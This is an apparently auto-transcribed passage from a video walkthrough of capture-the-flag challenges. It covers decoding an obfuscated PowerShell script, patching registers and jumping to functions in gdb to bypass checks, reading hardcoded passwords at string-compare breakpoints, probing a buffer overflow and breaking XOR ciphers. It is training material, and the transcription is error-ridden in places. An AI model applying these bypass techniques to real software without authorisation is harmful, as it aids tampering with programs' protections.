decode it non-encryption we should just get a powershell file i'm sure i could just do it through the command line but i'm lazy i like gooey sometimes and decrypting or decoding base64 is always a pain in powershell so that's why i'm using cyber shaft so looking at this we have output here and we can see it doing encrypt string and the piece of information we want is the salt and iv so let's create a running notes so saw iv the initialization vector the only thing we don't have is this password phrase so i'm going to look through this to see if we find passphrase and right here we're calling encrypt string and providing the passphrase right here so next thing in the script let's just copy it to this so we can look at it we want some type of decryption function and this only has the encrypt string um we see how it's doing it we could potentially write it i'm guessing like um maybe it's decrypt hash or something here but chances are this is just from the internet so what i'm going to do is copy up to here because this is where it starts getting unique output i'm just going to github.com and we're going to search all of github for that go to code wait it wants me to log in to look at code what why that's stupid um hold on one second i've opened up on my host so now i should be logged into github and we should be able to see the code that is stupid that wants you to log in but let's look at encrypt string let's click on a few of these to see if these have decrypt functions this does not here's one and here we go we do have decryption so let's just blindly try this so let's see let's go over here go back into notepad i'm going to paste my decryption routine and we want to put the salt as crazy simple salt make sure we have that t stupidly simple iv paste that and then we should be able to copy and paste this into powershell so decrypt string has been pasted in let's see do we have what we want to decrypt i'm going to copy and paste this again because i don't know where it went powershell so decrypt string paste in the encrypted form and then we want that amazingly strong password paste this and we do get the flag so that was that challenge simple enough let's go back here we could submit the flag boom okay so i think that's it for the forensics we already did that fish challenge earlier that was how we got into this that was the protected sheet so let's do these reversing challenges lucky guess let's download this can i guess the correct number so cp let's go into challenges maker lucky guess mv downloads here unzip it dot slash get lucky enter your name so we just gotta roll this a bunch so we could probably loop this right so if we did something like four i n sec 0 some high number and then let's see we're going to do this a few ways probably what if i can do do v test.sh i always get iffy when i put like pipes and stuff and um one-liners do get lucky does this accept arguments does not let's do echo asd like this there we go echo test doesn't matter what we put into this we just want to get lucky so if i bash test to or we can do t ah let's just direct it to a file output so we're running this a lot of times so if i go to challenges lucky guess do i have output created i do i hdb uh let's see eventually i would guess i get lucky and it hits so while that runs let's just gdb get lucky let's see can we disassemble main okay let's see where is the compare call puts puts let's open this up in guidro or we can do info functions okay we have winner so we can just run then jump to winner and i think that does it right yeah right here so that's one way to do it we just literally jump to [Music] the function but if i open this up in ghija we already have it open so let's open up challenges lucky guess let's see how this looks get lucky okay analyze it sure this should be like near instant functions main so let's see i actually don't see it doing the compare so we're not i'm guessing it screwed up and this is jumping to something see load effective address call game over where is the winner let's see you're seeing me like the very first time i opened something in ghidra so just like you i'm probably gonna flail around a little bit oh oh we did not that's a format string the dhtb the number is better luck can you roll probably well done is what we want right well done you managed to beat it okay let's go where is cross references now we can probably just jump this way there we go so void winner do we have cross references here it's under play okay this is where we want so this is where we want to set the breakpoint 31b right so if i break main run and then we b star copy everything up to the last three three one b continue hip sec and now we hit this we're on this compare so let's see we can do uh it's probably just an integer eax 49 and rbp minus 0x4 there's probably a better way to do this i'm just going to get the error message and see what it is um let's see that's not right ipsec play let's see you rolled 73 and 0x49 let's see google x0x49 to decimal is this 73 it is so we just have to find out what the roll is let's try not putting in brackets like that uh irat that's probably not right um let's see 4x or let's do 32x rbp b [Music] let's do -4 cf what is cf 0xcf to decimal 207 so i'm going to guess it's 207 i'm guessing i was not integer it's probably instruction and that's where my mistake was so let's do x eax let's see can we set eax to [Music] 0xcf or we probably should just say 207. let's see how do we set a register i think we just need a set like that there we go if i do now xeax okay that looks good step instruction so now we're doing a jump if not zero so let's see the zf flag oh no jump not equal uh forget how to tell if this is going to take the jump but let's just continue and see uh better luck next time so we did not win that um let's see i'm actually not sure how to do that piece i'm sure if you look in the comments somewhere tell me what i did wrong but we got a lot of challenges to do so let's see crep dash i hdb we never win that oh wait no the roll 133 number yeah that's changing we ran that like how many times test.sh a lot of times and never one oh it's still running right yeah so but theoretically that should work eventually but i guess the best way to do it is just um how he had done it i just want to try this one more time so we're going to run gonna do actually we need the brakes where's that break point come on there we go continue tip sec so we hit the break point and let's see eax is set to 0x93 i think x slash eax 93 and rbp minus four x slash rbp minus four let's see we just want one 3d so i'm thinking we should set eax to be 0x3d i wonder if we can do set this is equal to 0x93 what if that will work rbp minus four uh that did not do it that's now eight f so we royally screwed the program it may just sag fault now continue yeah segfault run hip sec i'm feeling silly that i'm not getting this um ax is 56 rbp minus 0x4 but at least you know this stuff is challenging whenever you don't do much reversing and all of a sudden get thrown into doing it let's see eax that 28 that's 28 oh wait yeah that may be right let's continue and see what we rolled and what it says oh we won so yeah i think before i just didn't do it in hex so that was probably my mistake but here we go we have going with the flow there so we want it by just editing that compare statement glad i actually stuck through that so now let's do the next challenge uh where is it is it somewhere in this pane select user github let's see crypto where are you here we go so we can submit this flag oh shoot um going with the flow there we go copy paste i had a lot of line breaks in it okay submit there we go so we've done forensics we did the very first reversing oh this is a 20-pointer let's do reverse me first after that one gdb1 i need some confidence before i move forward so this is revme.zip maker rev me let's go in it move downloads revme.zip here unzip it ah it's another exe yep another.net so let's do 192. and let's start a web server i actually probably did not need that because my web server may still be running so you kill that there we go go over here update this download rev me and then let's just open up in dnspy or we can execute it first to see what happens bad process found dn spy and it dies hey killed my dance by too rude cd downloads rev me so it's just saying can you pone me okay so we know it did a process called looking for dnspy that was interesting but we should be able just to open this up and let's explore it console app program oh embedded secret wow that was easy so it's just i wonder if strings would have got that i'm guessing it would have let's see submit flag i'm having confidence in that 10-point box oh the 20-pointer box let's see strings rev me grep dash i hdb yeah oh wait don't think it was that easy simple reversing challenge so that was a false flag uh dash e l there we go so um i just had to change the encoding and i got it so if i do man strings you can see encoding is dash e and then i normally just go through them one at a time i think it's e l and b whereas encoding dash e um let's see sbnl so generally when i'm stuck i just do lowercase l capital l right lowercase got it i'd also try s and then uh b as well and b looks like it gets it but yeah that is the reversing challenge we didn't even need windows for that one okay confidence is built up we got a authentication and it's using rust so it's probably gonna be pretty similar to the last challenge we did or the actual pwn so move authentication.zip unzip it authenticate and a password to proceed unauthorized to use this past uh application so let's set them up in ghidra see let's go up a folder i call it rust it's authenticate at least i hope this is the challenge i'm gonna make sure while it analyzes it yep i just called it rust okay so once this analyzes we will pretty much do the same exact thing we got main i'm gonna go into well if i just did the main out of like exports you get the same exact thing we saw before but if you get the main out of name spaces we have something actually usable oh it's not done yet i thought it was but this should help us if we can look do we have anything where is a compare i wonder if i can just search oh well it wouldn't be cmp here let's see there'd be a compare somewhere in this let's see step through this slowly rxc seek action main stack this is overflow guessing that's some type of protection undefined i'm like looking for the string of cyber geek i probably could just control f and search for it yeah let's go back so enter the password to proceed so if i just password not found that's interesting let's see though i wonder this is not in this function let's look at all the namespaces do we have other things like uh authenticate because we gotta find out exactly where we are here there's a validate and check password okay check password is probably what we want it's either one of these two validate or check password subroutine see you are not you're unauthorized core pointer wonder if this is it beaver and one [Music] we could probably change whatever this compare is just like we did before that is a test statement and then jnz so i could probably flip this or i wonder if we could just jump here let's see let's see if i can set a register to jump that let's do gdb dot slash authenticate um and for fun do we have like authenticate let's see main authenticated i wonder if i can just jump here be main run jump you've successfully authenticated and then it doesn't do anything did it write something nope that was weird i guess the um password is going to be the flag so we can jump to the authenticated but we need to get where the password is see let's see what validate is validate that's looking interesting i'm just going to go back to check password one more time then we're going to jump in gdp to figure this out so let's see the main thing i'm interested in is right here so this is saying essentially the equal zero probably is false so if beaver one is false beaver oh it's set here so this is probably the two things i want this is probably a compare statement if i look at the disassembly uh sure let's look at both of these so i'm going to break at 1b 9. so break star 0x1b9 we run it whoops um dell one b main run break star then we can do one b9 here continue so we want to hit break point three so i'm just gonna do ipsec and we hit break point three and we just want to look at these two addresses as we come in so rdi is currently just at c so if i do step instruction we look at rdi where is it it is the flag so that was easy enough and i bet the next one we have will be my user input so rsi let's look at what that is rsi is currently 0x7 so step instruction again and rsi is now ipsec so yeah it is loading those two things so right here it's just doing a compare here this beaver one is storing the result either true or false and over here it's saying hey if it's false do this if it's authenticated do this or if it's true do this so let's d out of this you know i'm authenticate put this password in and also authenticate that way so that challenge is done we are done with reversing so now it's pwn and i'm not looking forward to crypto one bit uh the pwn this is probably just gonna be like some rap challenge i'm guessing let's download this whoops download okay and maker pwn mv downloads what was it called phone me unzip and i'm just going to run strings first i hdb let's do same thing we recommended in that reversing challenge just to make sure it's not that easy l and then b is the last one okay it's not that easy what if we just execute pwn and your password as an argument wrong password okay python3 dash c import pt1 that was a muscle memory a times uh let's do 124. okay c paired me we do get a sag fault so chances are we can do something there let's just examine this real quick let's see go up pawn pawn me analyze is this it check password oh we may this may be very similar to the rust i bet we can just look at this sdr compare so 1de am i in the rust no this is prone me okay let's try this real quick gdb phone me let's just put abc there break main run b let's break here okay and then 1de continue run asd broken main okay we broke at check password we're doing a string compare and we can see asd is what i put and then right below that we have say in three so that's probably what it's doing this compare against um we have it in rdx and rsi as well and rax um if we call look at the let's see x64 rsi rdi rax calling convention argument see if i can find this on google quickly here we go is this it parameter passing let's see rcx rdx r8 r9 all floats let's see i wonder if that will line up so the first register is probably going to be rcx so what is rcx that is partially it what is rdx is rdx me no so this is wrong ignore everything i just said about that um but we can probably get super saiyan 3 and log in so control d pawn me super saiyan 3 there we go uh looks like it's supposed to be an overflow i don't know oh it's definitely overflow a bowl um because we're assigning looks like 16 for the size so we didn't need to do the what was it one 10 24 that i put in we could probably just overflow it with like 24. and then if we did that is there like a function that's when let's see and i don't know do we jump back to may i'm not exactly sure what we'd do um maybe jump back to maine but we have the flag let's just put this in before i overthink that submit flag crypto hopefully these are easy oh wait please is this just base64 echo dash n base64-d oh it's not that easy what is triple whammy okay so let's download this in code.zip so mr crypto i'm almost on this video i'm making better time than i thought would we call this easy probably encode.zip unzip this oh it's just xor so secret data redacted i wonder if i put this in if we just put the secret data to be this is that literally it python 3 xor encode python 2 i don't think that's it unless this is base64 echo dash n yep not that easy so what i'm guessing they want us to do is brute force this key right do i still have that nope let's get that passphrase back on my clipboard and since it is xor it's probably vulnerable to a known plain text attack and it's going to begin with a dhtb most likely because that's what all the other flags are so let's go over here we can delete this recipe we know this is definitely base64 so we can do from base64 put that in and then xor and then the key is going to be dhdb exclamation point or not exclamation um bracket and it's not hex that is i guess latin one and what we see i t [Music] i t then i so i'm guessing the key is going to be i t there we go xoring is fun so we got that there's probably like some x or brute force we could have done so if we did not do that we could do x or brute force and look here one of these is probably gonna begin with a d if we do x or length of two do any of these work let's see there we go so we could force it that way as well uh let's see let's add this in submit flag and we're on the very last one we've been told these keys hold a secret message can you decode it so that looks like three different hexes so move what is this triple whammy downloads triple whammy unzip this and then it's encrypted.pi see it looks like it is just going to be another xor and we are given three things so we can just copy these and we can paste this because i'm assuming we'll need these i'll just put it at the very end so this is probably ct1 this is ct2 and this is ct3 so we can delete those right yeah that's just printing so from secret import flag so this is a variable we don't have and that's the variable we want um and key one and key two are just um one time pads it's an equal length so we can't really brute force it easily because it's not like a repeating key it's all random so let's see it is xor though so we can kind of step back through this um probably want to do import and ascii and then read these in so then ascii dot on hex i like that do it to that oh god let's see then ascii.on hex fi there we go actually we'll hit period to redo okay so what we want to do is just reverse this so i'm going to do let's see key one is equal to the bxor of ct2 and ct3 so we're just undoing this step and then the next thing we want to do is do an xor again to remove something so we'll do flag is equal to bxor and we'll call it um key one and ct1 so essentially we xor this and what we're left with is flag in ct1 because i'm removing key and then we're going to xor it again and we'll be left with or xor with this and we'll be left with just the flag hopefully we're just stepping back through the xor so python 3 encrypt odd link string let's see c e done f b done there's a seven here that i erased there we go and we got x or x or x or fun fun fun so that is all of the challenges um let's see where is this so with this one being submitted that's going to be the video hope you guys enjoyed it take care and i will see you all next week